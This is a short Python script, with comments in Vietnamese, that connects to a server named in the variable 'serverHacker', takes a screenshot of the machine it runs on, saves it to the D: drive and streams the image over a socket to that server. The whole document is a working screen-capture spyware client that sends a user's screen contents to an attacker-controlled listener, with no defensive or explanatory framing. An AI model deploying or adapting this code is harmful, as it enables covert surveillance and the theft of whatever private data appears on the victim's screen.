import socket
import imutils
import pyautogui
import cv2
from datetime import datetime
import os

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

serverHacker = '192.168.1.3'
serverPort = 12345
clientSocket.connect((serverHacker, serverPort))

now = datetime.now()
nameScreen = "D:\\screenshot" + now.strftime("%H%M%S") + ".png"

# Chụp màn hình và lưu vào file ảnh
pyautogui.screenshot(nameScreen)

# Mở file ảnh ở chế độ đọc dạng byte
with open(nameScreen, "rb") as imageFile:
    file_size = os.path.getsize(nameScreen)
    print(file_size)
    clientSocket.send(str(file_size).encode())

    # Gửi dữ liệu ảnh từ file
    while True:
        data = imageFile.read(1024)
        if not data:
            break
        clientSocket.send(data)

# Đóng kết nối
clientSocket.close()